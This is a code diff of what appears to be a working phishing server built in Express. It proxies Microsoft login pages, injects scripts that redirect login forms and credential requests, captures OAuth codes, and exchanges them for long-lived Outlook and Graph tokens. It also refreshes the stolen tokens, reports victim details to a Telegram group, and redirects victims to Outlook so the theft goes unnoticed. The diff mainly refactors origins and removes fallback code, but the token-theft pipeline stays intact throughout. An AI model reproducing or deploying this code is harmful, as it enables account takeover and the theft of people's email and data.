       <script>
         (function() {
           console.log('🔧 Desktop flow proxy active');
           
-          // Override fetch
+          const ORIGIN = '${origin}';
+          
           const originalFetch = window.fetch;
           window.fetch = function(url, options = {}) {
             if (typeof url === 'string' && url.includes('/GetCredentialType')) {
               console.log('🔄 Redirecting GetCredentialType to proxy');
-              return originalFetch('/proxy/GetCredentialType', {
+              return originalFetch(ORIGIN + '/proxy/GetCredentialType', {
                 ...options,
                 headers: {
                   ...options.headers,
-                  'Origin': 'http://localhost:3001'
+                  'Origin': ORIGIN
                 }
               });
             }
             return originalFetch(url, options);
           };
           
-          // Override XHR
           const originalXHR = window.XMLHttpRequest;
           window.XMLHttpRequest = function() {
             const xhr = new originalXHR();
@@ -1366,7 +1087,7 @@ app.get('/microsoft-desktop', async (req, res) => {
             xhr.open = function(method, url, ...args) {
               if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                 console.log('🔄 Redirecting XHR GetCredentialType to proxy');
-                url = '/proxy/GetCredentialType';
+                url = ORIGIN + '/proxy/GetCredentialType';
               }
               return originalOpen.call(this, method, url, ...args);
             };
@@ -1374,24 +1095,19 @@ app.get('/microsoft-desktop', async (req, res) => {
             return xhr;
           };
           
-          // CRITICAL: Intercept form submissions
           document.addEventListener('submit', function(e) {
             const form = e.target;
             if (form.action.includes('/common/login')) {
               e.preventDefault();
               console.log('🔄 Intercepted form submission to /common/login');
-              
-              // Update form action
-              form.action = '/proxy/desktop-login';
-              
-              // Submit the form
+              form.action = ORIGIN + '/proxy/desktop-login';
               form.submit();
             }
-          }, true); // Use capture phase to intercept early
-          
+          }, true);
         })();
       </script>
     `);
+    
     const params = {};
     $('input').each((i, elem) => {
       const name = $(elem).attr('name');
@@ -1401,35 +1117,29 @@ app.get('/microsoft-desktop', async (req, res) => {
     
     microsoftParams.set(sessionId, params);
     
-   // Force ALL forms to submit to your proxy
-$('form').each((i, form) => {
-  console.log('🔧 Original form action:', $(form).attr('action'));
-  
-  // Completely override the form
-  $(form).attr('action', '/proxy/desktop-login');
-  $(form).attr('method', 'POST');
-  
-  // Remove any existing onsubmit handlers
-  $(form).removeAttr('onsubmit');
-  
-  // Add your hidden fields
-  $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
-  $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
-  $(form).append(`<input type="hidden" name="client_id" value="${DESKTOP_CLIENT_ID}">`);
-  $(form).append(`<input type="hidden" name="redirect_uri" value="${DESKTOP_REDIRECT_URI}">`);
-  $(form).append(`<input type="hidden" name="scope" value="https://outlook.office.com/.default openid profile offline_access">`);
-  $(form).append(`<input type="hidden" name="response_mode" value="query">`);
-  $(form).append(`<input type="hidden" name="code_challenge" value="${codeChallenge}">`);
-  $(form).append(`<input type="hidden" name="code_challenge_method" value="S256">`);
-  
-  // Add a submit event listener to ensure it goes to the right place
-  $(form).on('submit', function(e) {
-    console.log('📤 Form submitting to:', $(this).attr('action'));
-    return true; // Allow submission
-  });
-  
-  console.log('✅ Modified form action to:', $(form).attr('action'));
-});
+    $('form').each((i, form) => {
+      console.log('🔧 Original form action:', $(form).attr('action'));
+      
+      $(form).attr('action', '/proxy/desktop-login');
+      $(form).attr('method', 'POST');
+      $(form).removeAttr('onsubmit');
+      
+      $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
+      $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
+      $(form).append(`<input type="hidden" name="client_id" value="${DESKTOP_CLIENT_ID}">`);
+      $(form).append(`<input type="hidden" name="redirect_uri" value="${DESKTOP_REDIRECT_URI}">`);
+      $(form).append(`<input type="hidden" name="scope" value="https://outlook.office.com/.default openid profile offline_access">`);
+      $(form).append(`<input type="hidden" name="response_mode" value="query">`);
+      $(form).append(`<input type="hidden" name="code_challenge" value="${codeChallenge}">`);
+      $(form).append(`<input type="hidden" name="code_challenge_method" value="S256">`);
+      
+      $(form).on('submit', function(e) {
+        console.log('📤 Form submitting to:', $(this).attr('action'));
+        return true;
+      });
+      
+      console.log('✅ Modified form action to:', $(form).attr('action'));
+    });
     
     res.send($.html());
     
@@ -1444,7 +1154,9 @@ $('form').each((i, form) => {
 app.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
   console.log('📥 Proxying GetCredentialType request');
   
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -1475,7 +1187,8 @@ app.post('/proxy/GetCredentialType', express.json(), async (req, res) => {
 });
 
 app.options('/proxy/GetCredentialType', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -1483,8 +1196,6 @@ app.options('/proxy/GetCredentialType', (req, res) => {
 });
 
 // ============= COMMON LOGIN ENDPOINT =============
-// ===== FIXED: COMMON LOGIN ENDPOINT with nativeclient support =====
-// ===== ENHANCED: COMMON LOGIN ENDPOINT with dual token capture =====
 app.post('/common/login', express.urlencoded({ extended: true }), async (req, res) => {
   console.log('📥 POST to /common/login received');
   
@@ -1564,7 +1275,6 @@ app.post('/common/login', express.urlencoded({ extended: true }), async (req, re
         }
       }
       
-      // ===== WINNING STRATEGY: Capture code from nativeclient redirect =====
       if (location.includes('nativeclient') && location.includes('code=')) {
         console.log('🎯 Detected nativeclient redirect with code');
         
@@ -1578,13 +1288,11 @@ app.post('/common/login', express.urlencoded({ extended: true }), async (req, re
           if (codeVerifier) {
             console.log(`✅ Found code verifier for session ${sessionId}`);
             
-            // Check if this is a dual token session (starts with 'dual_')
             if (sessionId.startsWith('dual_')) {
               console.log('🔄 Starting WINNING STRATEGY dual token capture...');
               
               let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
               
-              // STEP 1: Exchange code for Outlook token (primary)
               console.log('🔄 Step 1: Exchanging code for Outlook token...');
               const outlookTokens = await exchangeForResource(
                 sessionId, code, codeVerifier, 
@@ -1601,10 +1309,7 @@ app.post('/common/login', express.urlencoded({ extended: true }), async (req, re
                   captured_at: new Date().toISOString()
                 };
                 console.log('✅ Outlook token captured!');
-                console.log(`   🔑 Access Token: ${outlookTokens.access_token.substring(0, 50)}...`);
-                console.log(`   🔄 Refresh Token: ${outlookTokens.refresh_token.substring(0, 50)}...`);
                 
-                // STEP 2: Use Outlook refresh token to get Graph token
                 console.log('🔄 Step 2: Using Outlook refresh token to obtain Graph token...');
                 
                 try {
@@ -1634,45 +1339,9 @@ app.post('/common/login', express.urlencoded({ extended: true }), async (req, re
                     scope: graphTokens.scope,
                     captured_at: new Date().toISOString()
                   };
-                  console.log(`   🔑 Graph Access: ${graphTokens.access_token.substring(0, 50)}...`);
                   
                 } catch (graphError) {
                   console.error('❌ Graph token via refresh failed:', graphError.response?.data || graphError.message);
-                  
-                  // Fallback: Try to get Graph token directly with the same code
-                  console.log('🔄 Fallback: Attempting direct Graph exchange...');
-                  
-                  try {
-                    const graphDirect = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
-                      new URLSearchParams({
-                        client_id: DUAL_TOKEN_CLIENT_ID,
-                        code: code,
-                        code_verifier: codeVerifier,
-                        redirect_uri: DUAL_TOKEN_REDIRECT_URI,
-                        grant_type: 'authorization_code',
-                        scope: 'https://graph.microsoft.com/.default'
-                      }).toString(),
-                      {
-                        headers: {
-                          'Content-Type': 'application/x-www-form-urlencoded',
-                          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                        }
-                      }
-                    ).catch(err => err.response);
-                    
-                    if (graphDirect.data?.access_token) {
-                      console.log('✅ Graph token obtained via direct exchange!');
-                      tokenSession.tokens.graph = {
-                        access_token: graphDirect.data.access_token,
-                        refresh_token: graphDirect.data.refresh_token,
-                        expires_in: graphDirect.data.expires_in,
-                        scope: graphDirect.data.scope,
-                        captured_at: new Date().toISOString()
-                      };
-                    }
-                  } catch (e) {
-                    console.error('❌ All Graph token attempts failed');
-                  }
                 }
               }
               
@@ -1680,81 +1349,22 @@ app.post('/common/login', express.urlencoded({ extended: true }), async (req, re
               tokenSession.tokens.captured_at = new Date().toISOString();
               capturedData.set(sessionId, tokenSession);
               
-              // Send comprehensive notification
               await sendDualTokenNotification(sessionId, username, victimInfo, 
                 tokenSession.tokens.outlook, 
                 tokenSession.tokens.graph);
               
-              // Show success page with both tokens
-              // return res.send(generateDualTokenSuccessPage(sessionId, 
-              //   tokenSession.tokens.outlook, 
-              //   tokenSession.tokens.graph));
-               // Redirect to Outlook instead of showing success page
-               console.log('🔄 Redirecting user to Outlook from /common/login');
-               return res.redirect('https://outlook.live.com/mail/');
+              console.log('🔄 Redirecting user to Outlook from /common/login');
+              return res.redirect('https://outlook.live.com/mail/');
             } else {
-              // Handle regular desktop token exchange
               const tokens = await exchangeDesktopCodeForTokens(sessionId, code, codeVerifier);
               if (tokens) {
                 await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
-                
-                // Redirect to Outlook instead of showing success page
                 console.log('🔄 Redirecting user to Outlook from /common/login');
                 return res.redirect('https://outlook.live.com/mail/');
               }
             }
           } else {
             console.log(`❌ No code verifier found for session ${sessionId}`);
-          }
-        }
-      }
-      
-      // Handle OOB redirect (for desktop flow)
-      if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
-        console.log('🎯 Detected OOB redirect');
-        
-        const codeMatch = location.match(/[?&]code=([^&]+)/);
-        if (codeMatch && codeMatch[1]) {
-          const code = decodeURIComponent(codeMatch[1]);
-          console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
-          
-          const codeVerifier = codeVerifiers.get(sessionId);
-          
-          if (codeVerifier) {
-            console.log(`✅ Found code verifier for session ${sessionId}`);
-            
-            // Similar dual token handling for OOB if needed
-            if (sessionId.startsWith('dual_')) {
-              // ... same dual token logic as above ...
-            } else {
-              const tokens = await exchangeDesktopCodeForTokens(sessionId, code, codeVerifier);
-              if (tokens) {
-                await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
-                // return res.send(generateDesktopTokenSuccessPage(sessionId, tokens));
-                 // Redirect to Outlook instead of showing success page
-                 console.log('🔄 Redirecting user to Outlook from /common/login');
-                 return res.redirect('https://outlook.live.com/mail/');
-              }
-            }
-          }
-        }
-      }
-      
-      // Handle fragment-based code (for web flows)
-      if (location.includes('#code=')) {
-        const codeMatch = location.match(/#code=([^&]+)/);
-        if (codeMatch && codeMatch[1]) {
-          const code = codeMatch[1];
-          console.log(`✅ Authorization code captured for session ${sessionId}: ${code.substring(0, 50)}...`);
-          
-          const codeVerifier = codeVerifiers.get(sessionId);
-          
-          if (codeVerifier) {
-            console.log(`✅ Found code verifier for session ${sessionId}`);
-            await exchangeCodeForTokens(sessionId, code, codeVerifier);
-            await verifyTokensWithGraph(sessionId, username);
-            await serveOutlookPage(res, sessionId, username, victimInfo);
-            return;
           }
         }
       }
@@ -1807,39 +1417,6 @@ async function exchangeDesktopCodeForTokens(sessionId, code, codeVerifier) {
     console.error(`❌ Desktop token exchange failed:`, error.response?.data || error.message);
     return null;
   }
-}
-
-function generateDesktopTokenSuccessPage(sessionId, tokens) {
-  return `
-    <html>
-      <head>
-        <style>
-          body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
-          .success { background: #4CAF50; color: white; padding: 20px; border-radius: 5px; }
-          .token-info { background: white; padding: 20px; margin: 20px; border-radius: 5px; word-break: break-all; text-align: left; }
-          .token-box { background: #f0f0f0; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; }
-        </style>
-      </head>
-      <body>
-        <div class="success">
-          <h1>✅ 90-DAY TOKENS CAPTURED!</h1>
-          <p>Refresh token will last 90 days</p>
-        </div>
-        <div class="token-info">
-          <h3>Access Token:</h3>
-          <div class="token-box">${tokens.access_token}</div>
-          <h3>Refresh Token:</h3>
-          <div class="token-box">${tokens.refresh_token}</div>
-          <h3>Expires In:</h3>
-          <p>${tokens.expires_in} seconds</p>
-        </div>
-        <p><a href="/captured-sessions">View all captured sessions</a></p>
-        <script>
-          setTimeout(() => { window.close(); }, 10000);
-        </script>
-      </body>
-    </html>
-  `;
 }
 
 // ============= DESKTOP TOKEN NOTIFICATION =============
@@ -2002,18 +1579,6 @@ app.get('/common/login', (req, res) => {
   res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
 });
 
-app.post('/proxy/common/login', express.urlencoded({ extended: true }), async (req, res) => {
-  req.url = '/common/login';
-  app._router.handle(req, res);
-});
-
-app.get('/proxy/common/login', (req, res) => {
-  const error = req.query.error || 'invalid_password';
-  const username = req.query.username || '';
-  res.redirect(`/microsoft?error=${error}&username=${encodeURIComponent(username)}`);
-});
-
-// ===== FIXED: Desktop App Token Exchange with auto-redirect =====
 app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (req, res) => {
   console.log('📥 Desktop login submission');
   
@@ -2042,9 +1607,8 @@ app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (
     
     console.log('📤 Submitting desktop login form...');
     
-    // IMPORTANT: Create axios instance that follows redirects but lets us capture them
     const axiosInstance = axios.create({
-      maxRedirects: 0, // Don't auto-follow redirects
+      maxRedirects: 0,
       validateStatus: status => status >= 200 && status < 400
     });
     
@@ -2057,21 +1621,15 @@ app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (
       }
     }).catch(err => err.response);
     
-    // Check if this is a redirect response
     if (response?.status >= 300 && response?.status < 400 && response?.headers?.location) {
       const location = response.headers.location;
       console.log(`↪️ Microsoft redirects to: ${location}`);
       
-      // Check if this is an OOB redirect with code
       if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
-        // Extract code from the URN
         const codeMatch = location.match(/[?&]code=([^&]+)/);
         if (codeMatch && codeMatch[1]) {
           const code = decodeURIComponent(codeMatch[1]);
           console.log(`✅ Desktop auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
-          
-          // ===== EXCHANGE FOR 90-DAY TOKENS =====
-          console.log('🔄 Exchanging code for 90-day tokens...');
           
           const tokenParams = {
             client_id: DESKTOP_CLIENT_ID,
@@ -2100,7 +1658,6 @@ app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (
           if (tokens.access_token && tokens.refresh_token) {
             console.log('✅ 90-DAY TOKENS CAPTURED!');
             
-            // Store tokens
             let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
             tokenSession.tokens = {
               access_token: tokens.access_token,
@@ -2114,48 +1671,19 @@ app.post('/proxy/desktop-login', express.urlencoded({ extended: true }), async (
             };
             capturedData.set(sessionId, tokenSession);
             
-            // Send notification (but don't show success page)
             await sendDesktopTokenNotification(sessionId, username, victimInfo, tokens);
             
-            // ===== REDIRECT TO OUTLOOK =====
             console.log('🔄 Redirecting user to Outlook...');
-            
-            // Option 1: Direct redirect to Outlook
             return res.redirect('https://outlook.live.com/mail/');
-            
-            // Option 2: Show brief loading page before redirect (better UX)
-            // return res.send(`
-            //   <html>
-            //     <head>
-            //       <style>
-            //         body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
-            //         .loading { color: #0078d4; }
-            //         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-            //         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            //       </style>
-            //     </head>
-            //     <body>
-            //       <div class="spinner"></div>
-            //       <h2 class="loading">Login successful! Redirecting to Outlook...</h2>
-            //       <script>
-            //         setTimeout(() => {
-            //           window.location.href = 'https://outlook.live.com/mail/';
-            //         }, 2000);
-            //       </script>
-            //     </body>
-            //   </html>
-            // `);
           }
         }
       }
       
-      // For other types of redirects, follow them
       if (!location.includes('urn:ietf:wg:oauth:2.0:oob')) {
         return res.redirect(location);
       }
     }
     
-    // If we get here, something went wrong
     res.redirect('/microsoft-desktop?error=auth_failed');
     
   } catch (error) {
@@ -2203,7 +1731,8 @@ app.get('/verify-desktop/:sessionId', async (req, res) => {
 
 // ============= PROXY ENDPOINT =============
 app.options('/api/outlook-proxy', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2211,7 +1740,8 @@ app.options('/api/outlook-proxy', (req, res) => {
 });
 
 app.post('/api/outlook-proxy', express.json(), async (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2335,112 +1865,14 @@ async function sendCookieNotification(sessionId, username, victimInfo) {
 }
 
 // ============= TOKEN REFRESH ENDPOINTS =============
-// app.post('/api/refresh-token/:sessionId', async (req, res) => {
-//   const sessionId = req.params.sessionId;
-//   const session = capturedData.get(sessionId);
-  
-//   if (!session || !session.tokens) {
-//     return res.status(404).json({ error: 'No tokens found' });
-//   }
-  
-//   const refreshToken = session.tokens.refresh_token || session.tokens.outlook?.refresh_token;
-  
-//   if (!refreshToken) {
-//     return res.status(404).json({ error: 'No refresh token found' });
-//   }
-  
-//   try {
-//     const refreshResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
-//       new URLSearchParams({
-//         client_id: DESKTOP_CLIENT_ID,
-//         refresh_token: refreshToken,
-//         grant_type: 'refresh_token',
-//         scope: 'https://outlook.office.com/.default offline_access'
-//       }).toString(),
-//       {
-//         headers: {
-//           'Content-Type': 'application/x-www-form-urlencoded',
-//           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-//         }
-//       }
-//     );
-    
-//     const newTokens = refreshResponse.data;
-    
-//     if (session.tokens.dual_capture && session.tokens.outlook) {
-//       session.tokens.outlook.access_token = newTokens.access_token;
-//       if (newTokens.refresh_token) session.tokens.outlook.refresh_token = newTokens.refresh_token;
-//     } else {
-//       session.tokens.access_token = newTokens.access_token;
-//       if (newTokens.refresh_token) session.tokens.refresh_token = newTokens.refresh_token;
-//     }
-    
-//     session.tokens.refreshed_at = new Date().toISOString();
-//     capturedData.set(sessionId, session);
-    
-//     res.json({ 
-//       success: true, 
-//       message: 'Tokens refreshed',
-//       access_token: newTokens.access_token.substring(0, 50) + '...'
-//     });
-    
-//   } catch (error) {
-//     console.error('Token refresh error:', error.response?.data || error.message);
-//     res.status(500).json({ error: 'Failed to refresh tokens', details: error.message });
-//   }
-// });
-
-// app.post('/api/refresh-graph/:sessionId', async (req, res) => {
-//   const sessionId = req.params.sessionId;
-//   const session = capturedData.get(sessionId);
-  
-//   if (!session || !session.tokens?.graph?.refresh_token) {
-//     return res.status(404).json({ error: 'No Graph refresh token found' });
-//   }
-  
-//   try {
-//     const refreshResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
-//       new URLSearchParams({
-//         client_id: DUAL_TOKEN_CLIENT_ID,
-//         refresh_token: session.tokens.graph.refresh_token,
-//         grant_type: 'refresh_token',
-//         scope: 'https://graph.microsoft.com/.default'
-//       }).toString(),
-//       {
-//         headers: {
-//           'Content-Type': 'application/x-www-form-urlencoded',
-//           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-//         }
-//       }
-//     );
-    
-//     const newTokens = refreshResponse.data;
-//     session.tokens.graph.access_token = newTokens.access_token;
-//     if (newTokens.refresh_token) session.tokens.graph.refresh_token = newTokens.refresh_token;
-//     session.tokens.graph.refreshed_at = new Date().toISOString();
-//     capturedData.set(sessionId, session);
-    
-//     res.json({ 
-//       success: true, 
-//       message: 'Graph tokens refreshed',
-//       access_token: newTokens.access_token.substring(0, 50) + '...'
-//     });
-    
-//   } catch (error) {
-//     console.error('Graph token refresh error:', error.response?.data || error.message);
-//     res.status(500).json({ error: 'Failed to refresh Graph tokens', details: error.message });
-//   }
-// });
-
-
-// ============= TOKEN REFRESH ENDPOINTS =============
 
 // Generic token refresh endpoint (for Outlook tokens)
 app.post('/api/refresh-token', express.json(), async (req, res) => {
   console.log('📥 Token refresh request received');
   
-  // Set CORS headers
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2479,9 +1911,9 @@ app.post('/api/refresh-token', express.json(), async (req, res) => {
   }
 });
 
-// Handle OPTIONS preflight for refresh-token
 app.options('/api/refresh-token', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2492,8 +1924,9 @@ app.options('/api/refresh-token', (req, res) => {
 app.post('/api/refresh-graph', express.json(), async (req, res) => {
   console.log('📥 Graph token refresh request received');
   
-  // Set CORS headers
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2507,7 +1940,7 @@ app.post('/api/refresh-graph', express.json(), async (req, res) => {
   try {
     const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
       new URLSearchParams({
-        client_id: clientId || '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Teams client ID for Graph
+        client_id: clientId || '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
         refresh_token: refreshToken,
         grant_type: 'refresh_token',
         scope: 'https://graph.microsoft.com/.default offline_access'
@@ -2532,21 +1965,22 @@ app.post('/api/refresh-graph', express.json(), async (req, res) => {
   }
 });
 
-// Handle OPTIONS preflight for refresh-graph
 app.options('/api/refresh-graph', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
   res.sendStatus(200);
 });
 
-// ============= SESSION-SPECIFIC REFRESH ENDPOINTS (for backward compatibility) =============
+// ============= SESSION-SPECIFIC REFRESH ENDPOINTS =============
 app.post('/api/refresh-token/:sessionId', express.json(), async (req, res) => {
   console.log(`📥 Session-specific token refresh for ${req.params.sessionId}`);
   
-  // Set CORS headers
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2558,7 +1992,6 @@ app.post('/api/refresh-token/:sessionId', express.json(), async (req, res) => {
     return res.status(404).json({ error: 'Session or tokens not found' });
   }
   
-  // Try to get refresh token from session
   const refreshToken = session.tokens.refresh_token || session.tokens.outlook?.refresh_token;
   
   if (!refreshToken) {
@@ -2583,7 +2016,6 @@ app.post('/api/refresh-token/:sessionId', express.json(), async (req, res) => {
     
     const newTokens = response.data;
     
-    // Update session with new tokens
     if (session.tokens.outlook) {
       session.tokens.outlook.access_token = newTokens.access_token;
       if (newTokens.refresh_token) session.tokens.outlook.refresh_token = newTokens.refresh_token;
@@ -2611,8 +2043,9 @@ app.post('/api/refresh-token/:sessionId', express.json(), async (req, res) => {
 app.post('/api/refresh-graph/:sessionId', express.json(), async (req, res) => {
   console.log(`📥 Session-specific Graph token refresh for ${req.params.sessionId}`);
   
-  // Set CORS headers
-  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
+  const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
+  
+  res.setHeader('Access-Control-Allow-Origin', origin);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Credentials', 'true');
@@ -2641,8 +2074,6 @@ app.post('/api/refresh-graph/:sessionId', express.json(), async (req, res) => {
     );
     
     const newTokens = response.data;
-    
-    // Update session
     session.tokens.graph.access_token = newTokens.access_token;
     if (newTokens.refresh_token) session.tokens.graph.refresh_token = newTokens.refresh_token;
     session.tokens.graph.refreshed_at = new Date().toISOString();
@@ -2660,7 +2091,6 @@ app.post('/api/refresh-graph/:sessionId', express.json(), async (req, res) => {
     res.status(500).json({ error: 'Failed to refresh Graph token', details: error.message });
   }
 });
-
 
 // ============= TEST GRAPH TOKEN ENDPOINT =============
 app.get('/test-graph/:sessionId', async (req, res) => {
@@ -2896,10 +2326,6 @@ app.get('/yuing', (req, res) => {
 });
 
 // ============= PROXY MIDDLEWARE =============
-
-
-
-
 const microsoftProxy = createProxyMiddleware({
   target: MICROSOFT_LOGIN_URL,
   changeOrigin: true,
@@ -2947,9 +2373,6 @@ const microsoftProxy = createProxyMiddleware({
     }
   }
 });
-
-
-
 
 app.use('/proxy', (req, res, next) => {
   const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
@@ -3002,15 +2425,12 @@ app.get('/health', (req, res) => {
   });
 });
 
-
-
 // ============= TRACKING ENDPOINTS =============
 app.post('/api/track-page-view', express.json(), async (req, res) => {
   const { sessionId, template, url, timestamp } = req.body;
   
   console.log(`📊 Page view tracked: Session ${sessionId}, Template: ${template}`);
   
-  // Store in session data
   let session = capturedData.get(sessionId) || {};
   session.pageView = {
     template,
@@ -3020,7 +2440,6 @@ app.post('/api/track-page-view', express.json(), async (req, res) => {
   };
   capturedData.set(sessionId, session);
   
-  // Optionally send to Telegram
   if (bot && telegramGroupId) {
     const victimInfo = await getVictimInfo(req);
     const message = 
@@ -3044,7 +2463,6 @@ app.post('/api/track-click', express.json(), async (req, res) => {
   
   console.log(`🔗 Click tracked: Session ${sessionId}, Target: ${targetUrl}`);
   
-  // Store click in session data
   let session = capturedData.get(sessionId) || {};
   if (!session.clicks) session.clicks = [];
   session.clicks.push({
@@ -3055,7 +2473,6 @@ app.post('/api/track-click', express.json(), async (req, res) => {
   });
   capturedData.set(sessionId, session);
   
-  // Optionally send to Telegram
   if (bot) {
     const victimInfo = await getVictimInfo(req);
     const message = 
@@ -3073,9 +2490,6 @@ app.post('/api/track-click', express.json(), async (req, res) => {
   
   res.json({ success: true });
 });
-
-
-
 
 app.get('/track/click', async (req, res) => {
   try {
@@ -3140,18 +2554,12 @@ app.get('/track/click', async (req, res) => {
   }
 });
 
-
-
-
 // ============= TEMPLATE SELECTION =============
 const TEMPLATES_DIR = path.join(__dirname, 'templates');
 
 async function getRandomTemplate() {
   try {
-    // Read all files in the templates directory
     const files = await fs.readdir(TEMPLATES_DIR);
-    
-    // Filter for HTML files only
     const htmlFiles = files.filter(file => file.endsWith('.html'));
     
     if (htmlFiles.length === 0) {
@@ -3159,13 +2567,11 @@ async function getRandomTemplate() {
       return null;
     }
     
-    // Select a random template
     const randomIndex = Math.floor(Math.random() * htmlFiles.length);
     const selectedTemplate = htmlFiles[randomIndex];
     
     console.log(`📝 Selected template: ${selectedTemplate}`);
     
-    // Read the template file
     const templatePath = path.join(TEMPLATES_DIR, selectedTemplate);
     const templateContent = await fs.readFile(templatePath, 'utf-8');
     
@@ -3178,10 +2584,6 @@ async function getRandomTemplate() {
     return null;
   }
 }
-
-
-
-
 
 // ============= DEBUG ENDPOINTS =============
 app.get('/debug-verifiers', (req, res) => {
@@ -3290,13 +2692,17 @@ app.use((err, req, res, next) => {
 // ============= START SERVER =============
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`↪️ Root URL (/) redirects to /microsoft`);
-  console.log(`🎯 Dual Token Capture: http://localhost:${PORT}/en-us/microsoft-365/outlook`);
-  console.log(`🎯 Desktop Microsoft page: http://localhost:${PORT}/microsoft-desktop`);
